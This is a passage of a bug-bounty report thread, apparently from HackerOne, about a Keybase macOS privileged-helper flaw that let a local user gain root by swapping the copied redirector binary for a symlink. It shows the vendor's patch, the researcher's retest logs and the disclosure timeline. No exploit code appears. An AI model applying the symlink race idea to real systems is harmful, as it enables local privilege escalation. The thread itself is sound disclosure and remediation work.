`NSFileTypeRegular` should prevent this attack vector.","markdown_message":"\u003cp\u003eYes, checking that the file is \u003ccode\u003eNSFileTypeRegular\u003c/code\u003e should prevent this attack vector.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-21T07:17:32.101Z","updated_at":"2018-12-21T07:17:32.101Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3874389,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a link to `bindfs` project we're using to detect that the file was read https://github.com/mpartel/bindfs (patch is included in the report). Also please don't forget to install npm modules (`npm install`) in `restart-kbhelper/` folder. If you need help with reproducing that vulnerability do not hesitate to contact us.","markdown_message":"\u003cp\u003eHere\u0026#39;s a link to \u003ccode\u003ebindfs\u003c/code\u003e project we\u0026#39;re using to detect that the file was read \u003ca title=\"https://github.com/mpartel/bindfs\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmpartel%2Fbindfs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mpartel/bindfs\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (patch is included in the report). Also please don\u0026#39;t forget to install npm modules (\u003ccode\u003enpm install\u003c/code\u003e) in \u003ccode\u003erestart-kbhelper/\u003c/code\u003e folder. If you need help with reproducing that vulnerability do not hesitate to contact us.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-21T07:34:57.210Z","updated_at":"2018-12-21T07:35:58.410Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3877187,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-21T17:15:29.460Z","updated_at":"2018-12-21T17:15:29.460Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3880015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have a fix, can you take a look?  I've also included the patch.\n\nNew DMG: https://s3.amazonaws.com/prerelease.keybase.io/darwin/Keybase-2.13.1-20181221191618%2Bb4a1bca.dmg\n\nThank you!","markdown_message":"\u003cp\u003eWe have a fix, can you take a look?  I\u0026#39;ve also included the patch.\u003c/p\u003e\n\n\u003cp\u003eNew DMG: \u003ca title=\"https://s3.amazonaws.com/prerelease.keybase.io/darwin/Keybase-2.13.1-20181221191618%2Bb4a1bca.dmg\" href=\"/redirect?url=https%3A%2F%2Fs3.amazonaws.com%2Fprerelease.keybase.io%2Fdarwin%2FKeybase-2.13.1-20181221191618%252Bb4a1bca.dmg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://s3.amazonaws.com/prerelease.keybase.io/darwin/Keybase-2.13.1-20181221191618%2Bb4a1bca.dmg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-22T01:16:56.019Z","updated_at":"2018-12-22T01:16:56.019Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":395831,"filename":"0001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/831/f287d6d39af111cc07ed2ae8cef7eedc4b2838dc/0001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch?response-content-disposition=attachment%3B%20filename%3D%220001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch%22%3B%20filename%2A%3DUTF-8%27%270001-osx-check-a-copied-binary-isn-t-actually-a-symlink.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060240Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=169793b1e10b59027f97355071a92996c3840b49c019afe61f791ca1ef07f00d"}],"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3880282,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Max,\n\nI reviewed the patch and it looks good to me. Problem is fixed now and I'm no longer able to obtain root.\n\nBest, Jan\n\n#### doit.sh\n\n```\n...\n  \"fatal\": false,\n  \"status\": {\n    \"code\": 1804,\n    \"desc\": \"exit status 1 (redirector)\",\n    \"fields\": null,\n    \"name\": \"ERROR\"\n  }\n}\nls: /pwned.txt: No such file or directory\n```\n\n#### ~/Library/Logs/keybase.service.log\n\n```\n...\n12.22.2018 05:56:54.212 KBInstaller:45[INFO] Install complete\n12.22.2018 05:56:54.212 KBInstaller:49[INFO] Privileged Helper: Installed, Bundle Version: 1.0.33\nVersion: 1.0.33\n12.22.2018 05:56:54.212 KBInstaller:49[INFO] Redirector: Install Error: Redirector must not be a symlink\n12.22.2018 05:56:54.212 Installer:96[INFO] Exit(1)\n2018-12-22T05:56:54.216777+01:00 ▶ [ERRO keybase install_darwin.go:604] 1199 Error starting redirector: exit status 1\n```","markdown_message":"\u003cp\u003eHey Max,\u003c/p\u003e\n\n\u003cp\u003eI reviewed the patch and it looks good to me. Problem is fixed now and I\u0026#39;m no longer able to obtain root.\u003c/p\u003e\n\n\u003cp\u003eBest, Jan\u003c/p\u003e\n\n\u003ch4 id=\"doit-sh\"\u003edoit.sh\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e...\n  \u0026quot;fatal\u0026quot;: false,\n  \u0026quot;status\u0026quot;: {\n    \u0026quot;code\u0026quot;: 1804,\n    \u0026quot;desc\u0026quot;: \u0026quot;exit status 1 (redirector)\u0026quot;,\n    \u0026quot;fields\u0026quot;: null,\n    \u0026quot;name\u0026quot;: \u0026quot;ERROR\u0026quot;\n  }\n}\nls: /pwned.txt: No such file or directory\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"library-logs-keybase-service-log\"\u003e~/Library/Logs/keybase.service.log\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e...\n12.22.2018 05:56:54.212 KBInstaller:45[INFO] Install complete\n12.22.2018 05:56:54.212 KBInstaller:49[INFO] Privileged Helper: Installed, Bundle Version: 1.0.33\nVersion: 1.0.33\n12.22.2018 05:56:54.212 KBInstaller:49[INFO] Redirector: Install Error: Redirector must not be a symlink\n12.22.2018 05:56:54.212 Installer:96[INFO] Exit(1)\n2018-12-22T05:56:54.216777+01:00 ▶ [ERRO keybase install_darwin.go:604] 1199 Error starting redirector: exit status 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-12-22T05:05:11.558Z","updated_at":"2018-12-22T05:05:11.558Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3881125,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Still, while the current fix works against this particular technique, we think it would be better to take a more defensive approach and check that the path indeed leads to a regular file, not just that it's not a symlink. Though we've tried with other file types but we cannot think of any other working variant that could be misused as of right now.","markdown_message":"\u003cp\u003eStill, while the current fix works against this particular technique, we think it would be better to take a more defensive approach and check that the path indeed leads to a regular file, not just that it\u0026#39;s not a symlink. Though we\u0026#39;ve tried with other file types but we cannot think of any other working variant that could be misused as of right now.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-22T12:15:26.898Z","updated_at":"2018-12-22T12:15:26.898Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3900104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That you for your great work here.  We have patched the hole and have a release candidate with the fix. In the end, we took the more restrictive approach that you recommend above:\n\nhttps://s3.amazonaws.com/prerelease.keybase.io/darwin-test/Keybase-2.12.4-20181227202844%2Bf616a46.dmg","markdown_message":"\u003cp\u003eThat you for your great work here.  We have patched the hole and have a release candidate with the fix. In the end, we took the more restrictive approach that you recommend above:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://s3.amazonaws.com/prerelease.keybase.io/darwin-test/Keybase-2.12.4-20181227202844%2Bf616a46.dmg\" href=\"/redirect?url=https%3A%2F%2Fs3.amazonaws.com%2Fprerelease.keybase.io%2Fdarwin-test%2FKeybase-2.12.4-20181227202844%252Bf616a46.dmg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://s3.amazonaws.com/prerelease.keybase.io/darwin-test/Keybase-2.12.4-20181227202844%2Bf616a46.dmg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-28T12:32:18.061Z","updated_at":"2018-12-28T12:32:18.061Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3900121,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```\nFrom 541cb255867580972b0cf736e201129ba19eb7d2 Mon Sep 17 00:00:00 2001\nFrom: Maxwell Krohn \u003cthemax@gmail.com\u003e\nDate: Sat, 22 Dec 2018 18:21:02 -0500\nSubject: [PATCH 1/9] slightly safer\n\n---\n osx/Helper/KBHelper.m | 13 +++++++++++--\n 1 file changed, 11 insertions(+), 2 deletions(-)\n\ndiff --git a/osx/Helper/KBHelper.m b/osx/Helper/KBHelper.m\nindex afce1943f..fd2ca6778 100644\n--- a/osx/Helper/KBHelper.m\n+++ b/osx/Helper/KBHelper.m\n@@ -163,8 +163,8 @@ - (NSURL *)copyBinaryForHelperUse:(NSString *)bin name:(NSString *)name error:(N\n     // symlink, since then a non-root user could change the binary\n     // after we check the signature.\n     NSString *dstPath = [dstURL path];\n-    if ([self linkExists:dstPath]) {\n-        *error = KBMakeError(-1, @\"Redirector must not be a symlink\");\n+    if (![self isRegularFile:dstPath]) {\n+        *error = KBMakeError(-1, @\"Redirector must be a regular file\");\n         return nil;\n     }\n \n@@ -269,6 +269,15 @@ - (BOOL)linkExists:(NSString *)linkPath {\n   return [attributes[NSFileType] isEqual:NSFileTypeSymbolicLink];\n }\n \n+- (BOOL)isRegularFile:(NSString *)linkPath {\n+  NSDictionary *attributes = [NSFileManager.defaultManager attributesOfItemAtPath:linkPath error:nil];\n+  if (!attributes) {\n+    return NO;\n+  }\n+  return [attributes[NSFileType] isEqual:NSFileTypeRegular];\n+}\n+\n+\n - (NSString *)resolveLinkPath:(NSString *)linkPath {\n   if (![self linkExists:linkPath]) {\n     return nil;\n-- \n2.17.1 (Apple Git-112)\n```\n","markdown_message":"\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003eFrom 541cb255867580972b0cf736e201129ba19eb7d2 Mon Sep 17 00:00:00 2001\nFrom: Maxwell Krohn \u0026lt;themax@gmail.com\u0026gt;\nDate: Sat, 22 Dec 2018 18:21:02 -0500\nSubject: [PATCH 1/9] slightly safer\n\u003c/span\u003e\n---\n osx/Helper/KBHelper.m | 13 +++++++++++--\n 1 file changed, 11 insertions(+), 2 deletions(-)\n\ndiff --git a/osx/Helper/KBHelper.m b/osx/Helper/KBHelper.m\n\u003cspan class=\"gh\"\u003eindex afce1943f..fd2ca6778 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/Helper/KBHelper.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/Helper/KBHelper.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -163,8 +163,8 @@\u003c/span\u003e - (NSURL *)copyBinaryForHelperUse:(NSString *)bin name:(NSString *)name error:(N\n     // symlink, since then a non-root user could change the binary\n     // after we check the signature.\n     NSString *dstPath = [dstURL path];\n\u003cspan class=\"gd\"\u003e-    if ([self linkExists:dstPath]) {\n-        *error = KBMakeError(-1, @\u0026quot;Redirector must not be a symlink\u0026quot;);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    if (![self isRegularFile:dstPath]) {\n+        *error = KBMakeError(-1, @\u0026quot;Redirector must be a regular file\u0026quot;);\n\u003c/span\u003e         return nil;\n     }\n\n@@ -269,6 +269,15 @@ - (BOOL)linkExists:(NSString *)linkPath {\n   return [attributes[NSFileType] isEqual:NSFileTypeSymbolicLink];\n }\n\n+- (BOOL)isRegularFile:(NSString *)linkPath {\n\u003cspan class=\"gi\"\u003e+  NSDictionary *attributes = [NSFileManager.defaultManager attributesOfItemAtPath:linkPath error:nil];\n+  if (!attributes) {\n+    return NO;\n+  }\n+  return [attributes[NSFileType] isEqual:NSFileTypeRegular];\n+}\n+\n+\n\u003c/span\u003e - (NSString *)resolveLinkPath:(NSString *)linkPath {\n   if (![self linkExists:linkPath]) {\n     return nil;\n\u003cspan class=\"gd\"\u003e-- \n\u003c/span\u003e\u003cspan class=\"p\"\u003e2.17.1 (Apple Git-112)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-12-28T12:35:12.809Z","updated_at":"2018-12-28T12:35:12.809Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3900132,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-28T12:36:02.381Z","updated_at":"2018-12-28T12:36:02.381Z","additional_data":{"duplicate_report_id":471629},"actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3906659,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks fine (we noticed the PR on GitHub). Please let us know when you're ready to disclose this.","markdown_message":"\u003cp\u003eLooks fine (we noticed the PR on GitHub). Please let us know when you\u0026#39;re ready to disclose this.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-30T15:49:40.926Z","updated_at":"2018-12-30T15:49:40.926Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3932716,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thanks again for this great bug report and and your research. Our current plan is to bounty and disclose this issue after our next release cycle (2.13.0), later this month. In the mean time, we're reaching out to all users who haven't upgraded to 2.12.6 yet and encouraging them to upgrade. We'll be in touch shortly.","markdown_message":"\u003cp\u003eHi, thanks again for this great bug report and and your research. Our current plan is to bounty and disclose this issue after our next release cycle (2.13.0), later this month. In the mean time, we\u0026#39;re reaching out to all users who haven\u0026#39;t upgraded to 2.12.6 yet and encouraging them to upgrade. We\u0026#39;ll be in touch shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-07T01:07:14.495Z","updated_at":"2019-01-07T01:07:14.495Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066212,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:12:54.867Z","updated_at":"2019-01-30T18:12:54.867Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"votava","url":"/votava"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066216,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:13:16.497Z","updated_at":"2019-01-30T18:13:16.497Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"votava","url":"/votava"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066217,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:13:26.820Z","updated_at":"2019-01-30T18:13:26.820Z","first_to_agree":true,"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066236,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:15:40.332Z","updated_at":"2019-01-30T18:15:40.332Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066237,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:15:40.392Z","updated_at":"2019-01-30T18:15:40.392Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066286,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We posted this security update: https://keybase.io/docs/secadv/kb004","markdown_message":"\u003cp\u003eWe posted this security update: \u003ca title=\"https://keybase.io/docs/secadv/kb004\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io%2Fdocs%2Fsecadv%2Fkb004\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io/docs/secadv/kb004\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:21:41.490Z","updated_at":"2019-01-30T18:21:41.490Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066289,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"BTW: You have typo in my surname :).","markdown_message":"\u003cp\u003eBTW: You have typo in my surname :).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:22:35.410Z","updated_at":"2019-01-30T18:22:35.410Z","actor":{"username":"votava","cleared":false,"url":"/votava","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066714,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry about that, it's now fixed!","markdown_message":"\u003cp\u003eSorry about that, it\u0026#39;s now fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:57:03.587Z","updated_at":"2019-01-30T18:57:03.587Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}